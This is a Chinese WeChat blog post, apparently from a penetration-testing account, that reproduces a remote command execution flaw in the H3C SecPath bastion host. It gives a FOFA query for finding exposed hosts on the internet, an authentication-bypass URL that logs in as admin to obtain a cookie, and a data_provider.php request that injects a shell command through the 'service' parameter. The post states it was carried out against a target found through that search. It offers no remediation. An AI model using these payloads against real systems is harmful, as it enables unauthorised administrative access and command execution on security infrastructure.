##  漏洞复现:H3C SecParh堡垒机 data provider.php 远程命令执行漏洞

椰子  [ 神隐攻防实验室 ](javascript:void\(0\);)

**神隐攻防实验室** ![]()

微信号 gh_84eef72d8c4d

功能介绍 安全知识学习，web渗透，安全资料分享！

____

__

收录于话题

  
  

点击蓝字/关注我们

  
![](https://gitee.com/fuli009/images/raw/master/public/20210805105948.png)

01:漏洞影响

H3C SecParh fortress machine  

![](https://gitee.com/fuli009/images/raw/master/public/20210805105948.png)

02:FOFA语法

  

app="H3C-SecPath-运维审计系统"

  

![](https://gitee.com/fuli009/images/raw/master/public/20210805105948.png)

03:漏洞利用

通过任意用户登录获取Cookie：  

/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin

  

/audit/data_provider.php?ds_y=2019&ds_m=04&ds_d=02&ds_hour=09&ds_min40&server_cond=&service=$(id)&identity_cond=&query_type=all&format=json&browse=true

  

  

![](https://gitee.com/fuli009/images/raw/master/public/20210805105948.png)

04:漏洞复现

  

    
    
    通过fofa语法app="H3C-SecPath-运维审计系统"找到一个登录页面

  

![](https://gitee.com/fuli009/images/raw/master/public/20210805105952.png)

  

先通过任意用户登录获取Cookie

  

    
    
    /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin

  

![](https://gitee.com/fuli009/images/raw/master/public/20210805105953.png)

然后换成最后POC进去，成功实现

    
    
    /audit/data_provider.php?ds_y=2019&ds_m=04&ds_d=02&ds_hour=09&ds_min40&server_cond=&service=$(id)&identity_cond=&query_type=all&format=json&browse=true

  

![](https://gitee.com/fuli009/images/raw/master/public/20210805105954.png)

  

  

预览时标签不可点

收录于话题 #

个 __

上一篇 下一篇

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

漏洞复现:H3C SecParh堡垒机 data provider.php 远程命令执行漏洞

最多200字，当前共字

__

发送中

写下你的留言

微信扫一扫  
关注该公众号

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

[知道了](javascript:;)

**长按识别前往小程序**

![]()

